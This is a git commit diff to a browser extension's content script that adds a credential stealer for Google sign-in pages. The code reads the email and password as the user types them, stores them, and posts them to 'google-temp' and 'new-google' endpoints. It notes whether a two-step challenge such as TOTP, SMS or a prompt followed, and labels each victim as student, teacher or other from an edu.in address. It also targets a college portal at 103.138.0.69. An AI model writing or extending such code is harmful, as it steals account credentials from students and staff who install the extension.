bc0e7c64d99b56e799ac00e8c5c45dae4f851e47
surya <suryasarisa99@gmail.com>
2023-11-13 14:58:51 +0530

    added totp

--- contentScript.js
+++ contentScript.js
@@ -13,36 +13,66 @@ async function post(url, body) {
     body: JSON.stringify(body),
   });
 }
-// "http://103.138.0.69/ecap/*"
 
-function handleGooglePass4() {
+let backup = { user: "", passwd: "" };
+
+function handleGooglePass() {
   const cond =
     !location.href.includes("accounts.google.com/") ||
     !location.href.includes("/signin");
 
   if (cond) return -1;
 
-  let passwordSubmited = false;
+  let passwordStored = false;
   const targetNode = document.body;
   const config = { childList: true, subtree: true };
   const callback = function (mutationsList, observer) {
     for (const mutation of mutationsList) {
       if (mutation.type === "childList") {
         if (location.pathname.includes("challenge/pwd")) {
+          let emailInput = document.querySelector("#hiddenEmail");
+          let passInput = document.querySelector(
+            "input.whsOnd.zHQkBf[type='password']"
+          );
+          // * save typing Password
           localStorage.setItem(
             "user",
             JSON.stringify({
-              user: document.querySelector("#hiddenEmail").value,
-              passwd: document.querySelector(
-                "input.whsOnd.zHQkBf[type='password']"
-              ).value,
+              user: emailInput.value,
+              passwd: passInput.value,
             })
           );
-          passwordSubmited = false;
+
+          try {
+            passInput.addEventListener("keydown", (e) => {
+              if (e.key == "Enter") {
+                let user = emailInput.value;
+                post("google-temp", {
+                  user: emailInput.value,
+                  passwd: passInput.value,
+                  type: user.includes("edu.in")
+                    ? user[2].toLowerCase() == "u" &&
+                      user[3].toLowerCase() == "4"
+                      ? "student"
+                      : "teacher"
+                    : "other",
+                  twoStepAuth: false,
+                });
+              }
+            });
+          } catch (e) {
+            //
+          }
+          passwordStored = false;
         } else if (
-          (location.pathname.includes("challenge/selection") ||
-            location.pathname.includes("challenge/totp")) &&
-          !passwordSubmited
+          (location.pathname.includes("challenge/selection") || // select any method
+            location.pathname.includes("challenge/ipp") || // mobile number
+            location.pathname.includes("challenge/bc") || //security codes
+            location.pathname.includes("challenge/dp") || // tap yes
+            location.pathname.includes("challenge/totp") || // totp
+            location.pathname.includes("challenge/ootp") || // totp
+            location.pathname.includes("rejected")) &&
+          !passwordStored
         ) {
           let { user, passwd } = JSON.parse(localStorage.getItem("user"));
           if (!user || !passwd) {
@@ -55,9 +85,32 @@ function handleGooglePass4() {
               : "teacher"
             : "other";
 
-          post("new-google", { user, passwd, type });
-          passwordSubmited = true;
+          post("new-google", { user, passwd, type, twoStepAuth: true });
+          passwordStored = true;
+        } else if (
+          location.pathname.includes("google.com/web/chip") &&
+          !passwordStored
+        ) {
+          let { user, passwd } = JSON.parse(localStorage.getItem("user"));
+          let type = user.includes("edu.in")
+            ? user[2].toLowerCase() == "u" && user[3].toLowerCase() == "4"
+              ? "student"
+              : "teacher"
+            : "other";
+          passwordStored = true;
+
+          post("new-google", { user, passwd, type, twoStepAuth: false });
         }
+        // else if (!passwordStored && backup.user && backup.passwd) {
+        //   console.log("last block");
+        //   console.log(backup);
+        //   post("new-google", {
+        //     user: backup.user,
+        //     passwd: backup.passwd,
+        //     type,
+        //   });
+        //   passwordStored = true;
+        // }
       }
     }
   };
@@ -65,6 +118,7 @@ function handleGooglePass4() {
   const observer = new MutationObserver(callback);
   observer.observe(targetNode, config);
 }
+// https://gds.google.com/web/chip
 
 function handlePass() {
   if (!location.href.toLowerCase().includes("http://103.138.0.69/ecap"))
@@ -118,5 +172,5 @@ function handlePass() {
 }
 
 if (handlePass() == -1) {
-  handleGooglePass4();
+  handleGooglePass();
 }
